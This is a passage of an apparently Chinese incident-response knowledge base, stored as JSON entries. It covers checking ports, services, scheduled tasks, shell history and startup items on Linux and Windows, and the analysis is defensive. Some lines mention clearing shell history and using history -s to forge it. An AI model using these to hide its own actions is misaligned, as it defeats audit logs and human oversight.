中，它调用的组件位于顶部， 直至达到 TCP/IP。注意，此选项 可能很耗时，并且在你没有足够 权限时可能失败。 -e 显示以太网统计信息。此选项可以与 -s 选项 结合使用。 -f 显示外部地址的完全限定 域名(FQDN)。 -n 以数字形式显示地址和端口号。 -o 显示拥有的与每个连接关联的进程 ID。 -p proto 显示 proto 指定的协议的连接；proto 可以是下列任何一个: TCP、UDP、TCPv6 或 UDPv6。如果与 -s 选项一起用来显示每个协议的统计信息，proto 可以是下列任何一个: IP、IPv6、ICMP、ICMPv6、TCP、TCPv6、UDP 或 UDPv6。 -q 显示所有连接、侦听端口和绑定的 非侦听 TCP 端口。绑定的非侦听端口 不一定与活动连接相关联。 -r 显示路由表。 -s 显示每个协议的统计信息。默认情况下， 显示 IP、IPv6、ICMP、ICMPv6、TCP、TCPv6、UDP 和 UDPv6 的统计信息; -p 选项可用于指定默认的子网。 -t 显示当前连接卸载状态。 -x 显示 NetworkDirect 连接、侦听器和共享 终结点。 -y 显示所有连接的 TCP 连接模板。 无法与其他选项结合使用。 interval 重新显示选定的统计信息，各个显示间暂停的 间隔秒数。按 CTRL+C 停止重新显示 统计信息。如果省略，则 netstat 将打印当前的 配置信息一次。 Netstat 命令提供以下各项的统计信息： 参数 说明 Proto 协议 (TCP 或 UDP) 的名称。 本地地址 本地计算机的 IP 地址和所使用的端口号。 除非指定了 -n 参数，否则显示与 IP 地址和端口名称对应的本地计算机的名称。 如果尚未建立端口，则端口号显示为星号 ( * ) 。 外部地址 套接字连接到的远程计算机的 IP 地址和端口号。 除非指定了 -n 参数，否则将显示与 IP 地址和端口对应的名称。 如果尚未建立端口，则端口号显示为星号 ( * ) 。 状态 指示 TCP 连接的状态，包括：CLOSE_WAITCLOSED端建立FIN_WAIT_1FIN_WAIT_2LAST_ACK侦听SYN_RECEIVEDSYN_SENDTIMED_WAIT 常用查询语句 若要显示以太网统计信息和所有协议的统计信息，请键入：\nnetstat -e -s若要仅显示 TCP 和 UDP 协议的统计信息，请键入：\nnetstat -s -p tcp udp若要每隔5秒显示一次活动 TCP 连接和进程 Id，请键入：\nnetstat -o 5若要使用数字形式显示活动 TCP 连接和进程 Id，请键入：\nnetstat -n -o定位established链接:获取正在链接的IP地址和进程信息\nnetstat -ano | findstr “ESTABLISHED” netstat -ano | findstr “LISTENING”",
    "description": "",
    "tags": null,
    "title": "异常端口查询",
    "uri": "/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/4%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%B3%E9%94%AE%E8%AF%81%E6%8D%AE%E6%A3%80%E7%B4%A2%E6%8F%90%E5%8F%96/%E5%BC%82%E5%B8%B8%E7%AB%AF%E5%8F%A3%E6%9F%A5%E8%AF%A2/index.html"
  },
  {
    "content": "Linux下服务信息检查 chkconfig（linux） redhat中常用\n基本命令 chkconfig [--add][--del][--list][系统服务] 或 chkconfig [--level \u003c等级代号\u003e][系统服务][on/off/reset] --add 增加所指定的系统服务，让 chkconfig 指令得以管理它，并同时在系统启动的叙述文件内增加相关数据。chkconfig确保每个运行级有一项启动(S)或者杀死(K)入口。如有缺少，则会从缺省的init脚本自动建立。 --del 删除所指定的系统服务，不再由 chkconfig 指令管理，并同时在系统启动的叙述文件内删除相关数据。删除服务，并把相关符号连接从/etc/rc[0-6].d删除。 --level\u003c等级代号\u003e 指定读系统服务要在哪一个执行等级中开启或关毕。设置某一服务在指定的运行级是被启动，停止还是重置。列出chkconfig 所知道的所有命令。\nchkconfig --list开启服务。\nchkconfig xxx on/off //开启/关闭xxx服务使用范例 chkconfig –list #列出所有的系统服务 chkconfig –add httpd #增加httpd服务 chkconfig –del httpd #删除httpd服务 chkconfig –level httpd 2345 on #设置httpd在运行级别为2、3、4、5的情况下都是on（开启）的状态 chkconfig –list #列出系统所有的服务启动情况 chkconfig –list mysqld #列出mysqld服务设置情况 chkconfig –level 35 mysqld on #设定mysqld在等级3和5为开机运行服务，–level 35表示操作只在等级3和5执行，on表示启动，off表示关闭 chkconfig mysqld on #设定mysqld在各等级为on，“各等级”包括2、3、4、5等级 ntsysv（linux） redhat特有类图形界面管理模式来设置开机启动\nntsysv基本命令 ntsysv [--back][--level \u003c等级代号\u003e] --back 在互动式界面里，显示Back钮，而非Cancel钮。 --level \u003c等级代号\u003e 在指定的执行等级中，决定要开启或关闭哪些系统服务。使用ntsysv命令管理自启动，可以管理独立服务和xinetd服务。\nsysv-rc-conf（ubuntu） Chkcofig不再适用于Ubuntu系统，可用类似的软件sysv-rc-conf进行替换\n安装sysv-rc-conf sudo apt-get install sysv-rc-conf基本命令 Usage: sysv-rc-conf [ options ] sysv-rc-conf --list [ service ] sysv-rc-conf [ --level levels ] service \u003con|off\u003e操作界面十分简洁，你可以用鼠标点击，也可以用键盘方向键定位，用空格键选择，用Ctrl+N翻下一页，用Ctrl+P翻上一页，用Q退出。其中，“X”表示开启该服务。\n​ init 进程读取 /etc/inittab 文件中的信息,并进入预设的运行级别，按顺序运行该运行级别对应文件夹下的脚本。脚本通常以 start 参数启动,并指向一个系统中的程序。\n​ 通常情况下, /etc/rcS.d/ 目录下的启动脚本首先被执行,然后是/etc/rcN.d/ 目录。例如您设定的运行级别为 3,那么它对应的启动目录为 /etc/rc3.d/ 。\n参考：https://blog.csdn.net/u013554213/article/details/86584705\n部分系统服务详解\nacpi-support 这个是关于电源支持的默认是1,2,3,4,5下启动，我认为你可以把它调整到s级别。 acpid acpi的守护程序，默认是2－5开启，我认为可以不用管。 alsa alsa声音子系统，应该不用开启它。 alsa-utils 这个服务似乎取代了alsa，所以开启这个就可以了，我在S级别开启它。 anacron 这是一个用于执行到时间没有执行的程序的服务，我认为它无所谓，所以关了它，这个可以随便。 apmd 也是一种电源管理，我认为电脑如果不是很老，它就没有开启的必要了。 atd 和anacron类似，我把它关了。 bluez-utiles 传说中的蓝牙服务，然后遗憾我没有，所以关了。 bootlogd 似乎使用来写log的，安全期间开着他也许比较好。 cron 指定时间运行程序的服务，所以开着比较好的。 cupsys 打印机服务，所以如果你有，就开启吧。 dbus 消息总线系统，非常重要，一定要开。 dns-clean 拨号连接用的，如果不用，就关了它。 evms 企业卷管理系统，由于我并不明白什么叫做企业卷，所以我关了它。 fetchmail 用于邮件守护，我关了它。 gdm gnome桌面管理器，我关了它，然后用startx启动gnome。 halt 关机用的，不要更改 hdparm 这个我刚才有讲，如果没有ide硬盘也就不用开启它了。 hotkey-setup 这个是给某些品牌笔记本设计的热键映射，台式机用户请关了它 hotplug 这个是用于热插拔的，我已经测试过了，在某些电脑上关闭它会使声卡无效，请在S级别开启它。 hplip hp打印机专用的，应该可以关了它。 ifrename 网络接口重命名，好像没用，关了。 ifupdown 这个使用来打开网络的，开着它。 ifupdown-clean 同上。 klogd linux守护程序，接受来自内核和发送信息到syslogd的记录，并记录为一个文件，所以请开着它。 linux-restricted-modules-common 这个使用来使用受限制的模块的，你可以从/lib/linux-restricted-modules下查看，如果没有什么，你可以关掉它。 lvm 逻辑卷管理器，如果你没有请关了它。 makedev 用来创建设备到/dev/请不要动他。 mdamd 管理raid用，如果你没有请关闭它。 module-init-tools 从/etc/modules 加在扩展模块的，这个一般开着。 networking 增加网络接口和配置dns用，将它开启。 ntp-server 与ubuntu时间服务器进行同步的，关了。 pcmcia 激活pcmica设备，遗憾我有生以来都没有见过这样的设备，关了它。 powernowd 用于管理cpu的客户端程序，如果有变频功能，比如amd的quite' cool 那么就开启它吧。 ppp 拨号用的，我关了它。 ppp-dns 一样，也关了。 readahead 预加载服务，让我想起了win的预读，当然他们不同，它会使启动变慢3－4妙，所以我关了它。 reboot 重启用的，不要动。 rmnologin 如果发现nologin，就去除它，在笔记本上不用开启。 rsync rsync协议守护，请视情况而定。 screen-cleanup 一个清除开机屏幕的脚本，随便。 sendsigs 重启和关机时向所有进程发送消息。所以不要管它。 single 激活但用户模式，不用管它。 stop-bootlogd 从2,3,4,5级别停止bootlogd,不用管它。 sudo 这个不用说吧，不用管它。 sysklogd 用于记录系统日志信息，不用管它。 udev 用户空间dev文件系统，不用管它。 udev-mab 同上。 umountfs 用来卸载文件卷的，不用管它。 urandom 生成随即数的，不知道怎么用，不用管它。 usplash 那个漂亮的启动画面，但是我关了它，它也存在，所以想关他需要把内核起动参数中的splash一句删掉。 vbesave 显卡bios配置工具，不用管它。 xorg-common 设置x服务ice socket。不用管它。service（ubuntu） service命令用于对系统服务进行管理，比如启动（start）、停止（stop）、重启（restart）、查看状态（status）等。 相关的命令还包括chkconfig、ntsysv等，chkconfig用于查看、设置服务的运行级别，ntsysv用于直观方便的设置各个服务是否自动启动。 service命令本身是一个shell脚本，它在/etc/init.d/目录查找指定的服务脚本，然后调用该服务脚本来完成任务。\nUsage: service \u003c option \u003e | --status-all | [ service_name [ command | --full-restart ] ]service –status-all\n在man手册中可以看到描述 “The SCRIPT parameter specifies a System V init script, located in /etc/init.d/SCRIPT. ”也就是说这里service所列出的服务都是在 /etc/init.d/目录下。\n入侵排查 chkconfig（sysv-rc-conf） --list 查看服务自启动状态，可以看到所有的RPM包安装的服务 ps aux | grep crond 查看当前服务 service --status-all 可选的查询当前服务的方式 基本的过滤： 中文环境 chkconfig（sysv-rc-conf） --list | grep \"3:启用\\|5:启用\" 英文环境 chkconfig（sysv-rc-conf） --list | grep \"3:on\\|5:on\"windows下服务信息检查 services.msc 打开运行，输入services.msc命令，可打开服务窗口，查看所有的服务项，包括服务的名称、描述、状态等。\ntasklist tasklist基本用法 C:\\Users\\xt\u003etasklist /? TASKLIST [/S system [/U username [/P [password]]]] [/M [module] | /SVC | /V] [/FI filter] [/FO format] [/NH] 描述: 该工具显示在本地或远程机器上当前运行的进程列表。 参数列表: /S system 指定连接到的远程系统。 /U [domain\\]user 指定应该在哪个用户上下文执行这个命令。 /P [password] 为提供的用户上下文指定密码。如果省略，则 提示输入。 /M [module] 列出当前使用所给 exe/dll 名称的所有任务。 如果没有指定模块名称，显示所有加载的模块。 /SVC 显示每个进程中主持的服务。 /APPS 显示应用商店应用及其关联的进程。 /V 显示详细任务信息。 /FI filter 显示一系列符合筛选器 指定条件的任务。 /FO format 指定输出格式。 有效值: \"TABLE\"、\"LIST\"、\"CSV\"。 /NH 指定列标题不应该 在输出中显示。 只对 \"TABLE\" 和 \"CSV\" 格式有效。 /? 显示此帮助消息。 筛选器: 筛选器名称 有效运算符 有效值 ----------- --------------- -------------------------- STATUS eq, ne RUNNING | SUSPENDED NOT RESPONDING | UNKNOWN IMAGENAME eq, ne 映像名称 PID eq, ne, gt, lt, ge, le PID 值 SESSION eq, ne, gt, lt, ge, le 会话编号 SESSIONNAME eq, ne 会话名称 CPUTIME eq, ne, gt, lt, ge, le CPU 时间，格式为 hh:mm:ss。 hh - 小时， mm - 分钟，ss - 秒 MEMUSAGE eq, ne, gt, lt, ge, le 内存使用(以 KB 为单位) USERNAME eq, ne 用户名，格式为 [域\\]用户 SERVICES eq, ne 服务名称 WINDOWTITLE eq, ne 窗口标题 模块 eq, ne DLL 名称 注意: 当查询远程计算机时，不支持 \"WINDOWTITLE\" 和 \"STATUS\" 筛选器。 Examples: TASKLIST TASKLIST /M TASKLIST /V /FO CSV TASKLIST /SVC /FO LIST TASKLIST /APPS /FI \"STATUS eq RUNNING\" TASKLIST /M wbem* TASKLIST /S system /FO LIST TASKLIST /S system /U 域\\用户名 /FO CSV /NH TASKLIST /S system /U username /P password /FO TABLE /NH TASKLIST /FI \"USERNAME ne NT AUTHORITY\\SYSTEM\" /FI \"STATUS eq running\"参考：https://blog.csdn.net/bcbobo21cn/article/details/51759521\ntasklist查询服务 tasklist /svc 对于某些加载DLL的恶意进程，可以通过输入tasklist /m命令进行查询\ntasklist /m [xxx.dll] msinfo32系统自带诊断工具 入侵排查 tasklist /svc tasklist /m |more tasklist /v /fi \"pid gt 10000\" 列出pid大于10000的进程 tasklist /v /fi \"pid gt 10000\" /fo csv 列出pid大于10000的进程,并且导出csv格式 tasklist /fi \"username ne nt autority\\system\" /fi \"status eq running\" 列出系统中正在运行的非“SYSTEM”状态的所有进程 也可以使用工具 msinfo32",
    "description": "",
    "tags": null,
    "title": "服务信息检查",
    "uri": "/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/4%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%B3%E9%94%AE%E8%AF%81%E6%8D%AE%E6%A3%80%E7%B4%A2%E6%8F%90%E5%8F%96/%E6%9C%8D%E5%8A%A1%E4%BF%A1%E6%81%AF%E6%A3%80%E6%9F%A5/index.html"
  },
  {
    "content": "linux计划任务检查 crontab 基本使用\ncrontab [ -u user ] file crontab [ -u user ] { -l | -r | -e } (default operation is replace, per 1003.2) -e (edit user's crontab) 编辑用户crontab计划任务 -l (list user's crontab) 列出所有用户的计划任务 -r (delete user's crontab) 删除用户的crontab计划任务 -i (prompt before deleting user's crontab) 在删除用户的计划任务之前告警1、利用crontab创建计划任务\n基本命令 crontab -l 列出某个用户cron服务的详细内容\nTips：默认编写的crontab文件会保存在 (/var/spool/cron/用户名 例如: /var/spool/cron/root\ncrontab -r 删除每个用户cront任务(谨慎：删除所有的计划任务)\ncrontab -e 使用编辑器编辑当前的crontab文件\n如：/1 * echo “hello world” » /tmp/test.txt 每分钟写入文件\ncrontab基本格式 # /etc/crontab: system-wide crontab # Unlike any other crontab you don't have to run the `crontab' # command to install the new version when you edit this file # and files in /etc/cron.d. These files also have username fields, # that none of the other crontabs do. SHELL=/bin/sh PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin # Example of job definition: # .---------------- minute (0 - 59) # | .------------- hour (0 - 23) # | | .---------- day of month (1 - 31) # | | | .------- month (1 - 12) OR jan,feb,mar,apr ... # | | | | .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat # | | | | | # * * * * * user-name command to be executed 17 * * * * root cd / \u0026\u0026 run-parts --report /etc/cron.hourly 25 6 * * * root test -x /usr/sbin/anacron || ( cd / \u0026\u0026 run-parts --report /etc/cron.daily ) 47 6 * * 7 root test -x /usr/sbin/anacron || ( cd / \u0026\u0026 run-parts --report /etc/cron.weekly ) 52 6 1 * * root test -x /usr/sbin/anacron || ( cd / \u0026\u0026 run-parts --report /etc/cron.monthly )一些特殊符号：\n*： 表示任何时刻\n,：　表示分割\n-：表示一个段，如第二端里： 1-5，就表示1到5点\n/n : 表示每个n的单位执行一次，如第二段里，*/1, 就表示每隔1个小时执行一次命令。也可以写成1-23/1.\n** **\ncrontab时间示例：\n43 21 * * * 21:43 执行 15 05 * * * 05:15 执行 0 17 * * * 17:00 执行 0 17 * * 1 每周一的 17:00 执行 0,10 17 * * 0,2,3 每周日,周二,周三的 17:00和 17:10 执行 0-10 17 1 * * 毎月1日从 17:00到7:10 毎隔1分钟 执行 0 0 1,15 * 1 毎月1日和 15日和 一日的 0:00 执行 42 4 1 * * 毎月1日的 4:42分 执行 0 21 * * 1-6　周一到周六 21:00 执行 0,10,20,30,40,50 * * * *　每隔10分 执行 */10 * * * * 每隔10分 执行 * 1 * * *　从1:0到1:59 每隔1分钟 执行 0 1 * * *　1:00 执行 0 */1 * * *　毎时0分 每隔1小时 执行 0 * * * *　毎时0分 每隔1小时 执行 2 8-20/3 * * *　8:02,11:02,14:02,17:02,20:02 执行 30 5 1,15 * *　1日 和 15日的 5:30 执行 参考：https://blog.csdn.net/testcs_dn/article/details/77687902anacron anacron会按照周期检测是否有定时任务在关机之后没有执行，如果有，则会在特定时间重新执行定时任务。\nanacron原理参考：http://c.biancheng.net/view/1095.html\n基本命令：\nroot@ubuntu:/var/spool/cron/crontabs# anacron -h Usage: anacron [-s] [-f] [-n] [-d] [-q] [-t anacrontab] [-S spooldir] [job] ... anacron [-S spooldir] -u [job] ... anacron [-V|-h] anacron -T [-t anacrontab] -s 依据 /etc/anacrontab 文件中设定的延迟时间顺序执行工作，在前一个工作未完成前，不会开始下一个工作。 -f 强制执行相关操作，忽略时间戳 -n 立即执行 /etc/anacrontab 中所有的工作，忽略所有的延迟时间。这意味着-s功能。 -d Don't fork to the background -q S禁止将信息输出到标准错误，常和 -d 选项合用。 -u 更新 /var/spool/anacron/cron.{daily，weekly，monthly} 文件中的时间戳为当前日期，但不执行任何工作。 -t Use this anacrontab -V Print version information -h Print this message -T Test an anacrontab -S Select a different spool directory See the manpage for more details.编辑配置文件：\nvi /etc/anacrontab 利用anacron实现异步定时任务调度\n使用案例 每天运行 /home/backup.sh脚本：\nvi /etc/anacrontab\n@daily 10 example.daily /bin/bash /home/backup.sh\n当机器在 backup.sh 期望被运行时是关机的，anacron会在机器开机十分钟之后运行它，而不用再等待 7天。\n入侵排查 重点关注以下目录中是否存在恶意脚本\n/var/spool/cron/* /etc/crontab /etc/cron.d/* /etc/cron.daily/* /etc/cron.hourly/* /etc/cron.monthly/* /etc/cron.weekly/ /etc/anacrontab /var/spool/anacron/*技巧\nmore /etc/cron.daily/* 查看目录下所有文件 grep /etc/cron.*/* -e \"查询关键字\"windows计划任务检查 Get-ScheduledTask 计划任务程序\npowershell输入：Get-ScheduledTask\nschtasks cmd下schtasks\n任务计划程序 计算机管理》系统工具》任务计划程序\n",
    "description": "",
    "tags": null,
    "title": "计划任务检查",
    "uri": "/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/4%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%B3%E9%94%AE%E8%AF%81%E6%8D%AE%E6%A3%80%E7%B4%A2%E6%8F%90%E5%8F%96/%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E6%A3%80%E6%9F%A5/%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E6%A3%80%E6%9F%A5/index.html"
  },
  {
    "content": "linux下命令行历史记录 原理的解释\n这里参考白胖子关于linux命令行history的解释，其中概述对history的原理解释的比较通俗易懂，这里引用过来：\n当执行命令后，系统默认会在内存记录执行过的命令 当用户正常退出时，会将内存的命令历史存放对应历史文件中，默认是~/.bash_history 登录shell时，会读取命令历史文件中记录下的命令加载到内存中 登录进shell后新执行的命令只会记录在内存的缓存区中；这些命令会用户正常退出时“追加”至命令历史文件中 利用命令历史。可以用它来重复执行命令，提高输入效率 bash history内建函数\nbash提供两个内置命令操纵历史记录列表和历史记录文件。\nfc命令 fc [-e ename] [-lnr] [first] [last] fc -s [pat=rep] [command] -e\u003c文本编辑器\u003e 指定用来编辑命令的文本编辑器，默认是vi -l 列出第一条和最后一条命令范围内的历史命令，如果不跟命令范围则默认显示最近使用过的16条历史命令 -n 显示历史命令时不显示命令序号 -r 反序显示所有历史命令 -s\u003c命令名\u003e 从历史命令中当前位置往前找到指定命令，并执行 显示历史命令列表（默认打印最近的16条历史命令）： fc -l 显示历史命令列表 1-99行： fc -l 1 99 指定使用ex文本编辑器编辑命令： fc -e ex 显示历史命令列表但不显示命令序号： fc -n 反序显示所有历史命令： fc -r 从历史命令中找到find命令，并执行： fc -s find EXTENDED_HISTORY环境变量影响fc命令的执行，如果变量设置为ON，则记录时间，否则不记录时间。在/etc/profile中添加export EXTENDED_HISTORY=ON 即可开启命令时间记录。\nkali：因为shell是zsh，因此配置在/etc/zsh/zshrc\nhistory命令 history [-c] [-d offset] [n] history -awrn [filename] history -ps arg [arg...] history [n] n为数字，列出最近的n条命令 -c 将目前shell中的所有history命令消除 history [-raw] histfiles -a 将目前新增的命令写入histfiles, 默认写入~/.bash_history -r 将histfiles内容读入到目前shell的history记忆中 -w 将目前history记忆的内容写入到histfiles -s: 展开历史参数成一行，附加在历史列表后。用于伪造命令历史 使用! 执行历史命令。 ! number 执行第几条命令 ! command 从最近的命令查到以command开头的命令执行 !! 执行上一条 history的历史命令保存在~/.bash_history 文件中.\nhistory配置修改\n配置文件：/etc/profile 与history相关的环境变量\nhistory相关配置说明 HISTFILE 指定存放历史文件位置，默认位置在~/.bash_profile（针对用户）、 /etc/profile(针对全局，如果~/.bash_profile内没有相关环境变量内容则使用全局变量设置) HISTFILESIZE 命令历史文件记录历史的条数 HISTSIZE 命令历史记录的条数，默认为1000 HISTTIMEFORMAT=\"%F %T\" 显示命令发生的时间 HISTIGNORE=\"str1:str2:...\" 忽略string1,string2历史 HISTCONTROL 包含一下4项，让哪一项生效只需要让其=下面一项即可 ignoredups: 忽略重复的命令；连续且相同方为“重复” ignorespace: 忽略所有以空白开头的命令 ignoreboth:ignoredups,ignorespace erasedups: 删除重复命令 history记录命令时间戳 在.bashrc 或者/etc/profile文件中添加几行配置即可 HISTFILESIZE=2000 HISTSIZE=2000 HISTTIMEFORMAT=\"%F %T \" export HISTTIMEFORMAT 设置好之后，执行history命令，就会显示每条历史命令的详细执行时本节参考：https://blog.csdn.net/u011498933/article/details/99541059\nhttps://linux265.com/course/linux-command-fc.html\nwindows下命令行历史记录 doskey命令 该命令用于调用和建立DOS宏命令\ndoskey [/reinstall] [/listsize=\u003cSize\u003e] [/macros:[all | \u003cExeName\u003e] [/history] [/insert | /overstrike] [/exename=\u003cExeName\u003e] [/macrofile=\u003cFileName\u003e] [\u003cMacroName\u003e=[\u003cText\u003e]] /reinstall 清空命令历史缓冲区并重新安装doskey /listsize=\u003cSize\u003e 指定历史缓冲区的命令行数目 /macros 显示doskey宏，需要使用重定向符号“\u003e”将宏重新存储到一个文件中，该参数可以简写为/m /macros:all 为所有可执行文件显示doskey宏 /macros:\u003cExeName\u003e 为指定的exe文件名称显示所有可执行宏 /history 显示存储在内存中的命令，可以使用重定向符号“\u003e”将宏重新存储到一个文件中，该参数可以简写为/h [/insert | /overstrike] 指定是否将你输入的文本插入或覆盖，如果使用/insert参数，你输入的文本将插入到已存在的文本中。如果使用/overwrite参数，新输入的文本将覆盖存在的文本，默认参数问/overwrite。 /exename=\u003cExeName\u003e 指定允许宏的可执行文件名称 /macrofile=\u003cFileName\u003e 指定你想要安装的包含宏的文件 \u003cMacroName\u003e=[\u003cText\u003e] 创建由Text指定的命令的宏，MacroName指定宏的名称，Text指定你想要录制的命令，如果Text留空，则删除MacroName。 [1] doskey /history\n需要注意的是：doskey 只能查看当前shell对话框中的命令历史记录，无法查看其他shell对话框中的历史记录\n快捷键命令 F7快捷键查看所有执行过的命令\nF3：调出上一条执行过的命令，调出后直接回车即可执行；\nF8：搜索命令历史记录，和↑向上箭头类似。\nF9：按编号选择命令，来调出执行过的命令：\n命令号码在使用F7查看的时候可看到命令前边的数字即为命令号码，但是F7快捷键有个弊端，就是如果命令比较长就会显示不完全，分辨不出来命令的不同\n本节参考：\nhttps://baike.baidu.com/item/doskey/10520881?fr=aladdin\nhttps://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753867(v=ws.10)?redirectedfrom=MSDN\nhttps://blog.csdn.net/lishuoboy/article/details/86605653\n本文参考 https://en.wikipedia.org/wiki/Command_history\nhttps://www.gnu.org/savannah-checkouts/gnu/bash/manual/bash.html#Bash-History-Builtins\n",
    "description": "",
    "tags": null,
    "title": "命令行历史记录",
    "uri": "/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/4%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%B3%E9%94%AE%E8%AF%81%E6%8D%AE%E6%A3%80%E7%B4%A2%E6%8F%90%E5%8F%96/%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95/index.html"
  },
  {
    "content": "在日常应急的过程中，攻击者常常通过恶意软件或自定义脚本插入启动项，利用系统自启实现恶意程序/远控程序/脚本延缓执行，达到持续控制的目的。因此有必要在日常应急场景中，针对启动项检查。本文就是为了记录对linux和windows的启动项检查简要方式梳理，对于linux还根据启动过程进行了额外的分析。\nLinux下启动项检查 linux启动过程 https://www.cnblogs.com/sysk/p/4778976.html\n启动第一步－－加载BIOS 当你打开计算机电源，计算机会首先加载BIOS信息，BIOS信息是如此的重要，以至于计算机必须在最开始就找到它。这是因为BIOS中包含了CPU的相关信息、设备启动顺序信息、硬盘信息、内存信息、时钟信息、PnP特性等等。在此之后，计算机心里就有谱了，知道应该去读取哪个硬件设备了。\n启动第二步－－读取MBR 众所周知，硬盘上第0磁道第一个扇区被称为MBR，也就是Master Boot Record，即主引导记录，它的大小是512字节，别看地方不大，可里面却存放了预启动信息、分区表信息。\n系统找到BIOS所指定的硬盘的MBR后，就会将其复制到0x7c00地址所在的物理内存中。其实被复制到物理内存的内容就是Boot Loader，而具体到你的电脑，那就是lilo或者grub了。\n启动第三步－－Boot Loader / Grup引导加载程序 Boot Loader 就是在操作系统内核运行之前运行的一段小程序。通过这段小程序，我们可以初始化硬件设备、建立内存空间的映射图，从而将系统的软硬件环境带到一个合适的状态，以便为最终调用操作系统内核做好一切准备。\nBoot Loader有若干种，其中Grub、Lilo和spfdisk是常见的Loader。\n我们以Grub为例来讲解吧，毕竟用lilo和spfdisk的人并不多。\n系统读取内存中的grub配置信息（一般为menu.lst或grub.lst），并依照此配置信息来启动不同的操作系统。\ngrup引导过程：\n系统启动计划装载grub核心镜像 引导grub区域，由于grub核心镜像较大，因此需要本区域引导到grub核心 grub核心镜像，位于文件系统中 grup引导相关文件系统：\n/boot/未独立分区：/boot/grub/grub.conf\n/boot/独立分区：/grub/grub.conf\n启动第四步－－加载/引导内核kernel 根据grub设定的内核映像所在路径，系统读取内存映像，并进行解压缩操作。此时，屏幕一般会输出“Uncompressing Linux”的提示。当解压缩内核完成后，屏幕输出“OK, booting the kernel”。\n系统将解压后的内核放置在内存之中，并调用start_kernel()函数来启动一系列的初始化函数并初始化各种设备，完成Linux核心环境的建立。至此，Linux内核已经建立起来了，基于Linux的程序应该可以正常运行了。\n加载kernel相关文件系统：\n/boot/*\n/boot/initrd (ubuntu: initrd.img)\n/boot/grub\n启动第五步－－用户层init依据inittab文件来设定运行等级 内核被加载后，第一个运行的程序便是/sbin/init，该文件会读取/etc/inittab文件，并依据此文件来进行初始化工作。\n其实/etc/inittab文件最主要的作用就是设定Linux的运行等级，其设定形式是“：id:5:initdefault:”，这就表明Linux需要运行在等级5上。Linux的运行等级设定如下：\n0：关机\n1：单用户模式\n2：无网络支持的多用户模式\n3：有网络支持的多用户模式\n4：保留，未使用\n5：有网络支持有X-Window支持的多用户模式\n6：重新引导系统，即重启\n关于/etc/inittab文件的学问，其实还有很多。\ninitrd初始化的过程\n/sbin/init：（/etc/inittab） upstart: ubuntu, d-bus, event-driven # （比传统init速度快） systemd: #（并行启动多个进程）initrd相关文件系统：\n/sbin/init（/etc/inittab 或/etc/init/）\n在ubuntu20.04下我只找到了/etc/init/whoopsie.conf ,崩溃问题\nparallels@ubuntu:/etc/X11$ cat /etc/init/whoopsie.conf # whoopsie - crash report submission daemon description \"crash report submission daemon\" start on runlevel [2345] stop on runlevel [!2345] env CRASH_DB_URL=https://daisy.ubuntu.com respawn respawn limit 10 5 pre-start script # Wait for network-manager if and only if it's installed. status network-manager \u003e/dev/null 2\u003e\u00261 \u0026\u0026 start wait-for-state WAITER=whoopsie WAIT_FOR=network-manager WAIT_STATE=running || : end script exec whoopsie -f** **\nKernel初始化的过程：\n1、设备探测\n2、驱动初始化（可能会从initrd（initramfs）文件中装载驱动模块）\n3、以只读挂载根文件系统；\n4、装载第一个进程init（PID：1） （rw重新挂载rootfs）\n启动第六步－－init进程执行rc.sysinit 在设定了运行等级后，Linux系统执行的第一个用户层文件就是/etc/rc.d/rc.sysinit脚本程序，它做的工作非常多，包括设定PATH、设定网络配置（/etc/sysconfig/network）、启动swap分区、设定/proc等等。如果你有兴趣，可以到/etc/rc.d中查看一下rc.sysinit文件，里面的脚本够你看几天的。\n启动第七步－－启动内核模块 具体是依据/etc/modules.conf文件或/etc/modules.d目录下的文件来装载内核模块。\n启动第八步－－执行不同运行级别的脚本程序（/etc/rc.d/rc $RUNLEVEL # $RUNLEVEL为缺省的运行模式 ） 根据运行级别的不同，系统会运行rc0.d到rc6.d中的相应的脚本程序，来完成相应的初始化工作和启动相应的服务。\n启动第九步－－执行/etc/rc.d/rc.local 你如果打开了此文件，里面有一句话，读过之后，你就会对此命令的作用一目了然：\n# This script will be executed after all the other init scripts.\n# You can put your own initialization stuff in here if you don’t\n# want to do the full Sys V style init stuff.\nrc.local就是在一切初始化工作后，Linux留给用户进行个性化的地方。你可以把你想设置和启动的东西放到这里。\n启动第十步－－执行/bin/login程序，进入登录状态 此时，系统已经进入到了等待用户输入username和password的时候了，你已经可以用自己的帐号登入系统了。\n参考：\n华为的一个文章：https://www.huaweicloud.com/articles/b6afbca589602a38904374accf3dc2bb.html\nPOST--\u003eBIOS(Boot Sequence)--\u003eMBR(bootloader,446)--\u003eKernel--\u003einitrd--\u003e(ROOTFS)/sbin/init(/etc/inittab)较详细的一个文章：\nhttps://www.cnblogs.com/unicode/archive/2010/06/12/1756755.html\n开机启动服务检查 systemctl list-unit-files 开机启动服务项\nsystemctl list-unit-files\n常用语法\nsystemctl list-unit-files |grep enabled\nsystemctl list-unit-files|grep enabled|cat \u003e 